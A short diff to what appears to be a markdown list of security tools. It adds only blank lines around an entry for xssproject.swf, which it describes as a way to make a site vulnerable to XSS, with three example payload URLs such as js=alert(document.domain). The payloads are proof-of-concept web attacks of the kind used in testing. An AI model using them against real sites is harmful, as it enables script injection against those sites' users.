@@ -42,8 +42,11 @@
 * :small_red_triangle_down: xssproject.swf
 
 > Make a website vulnerable to XSS if you can upload/include a SWF file into that website. 
+
 > Example 1 => /xssproject.swf?js=alert(document.domain); 
+
 > Example 2 => /xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}
+
 > Example 3 => /xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);
 
 
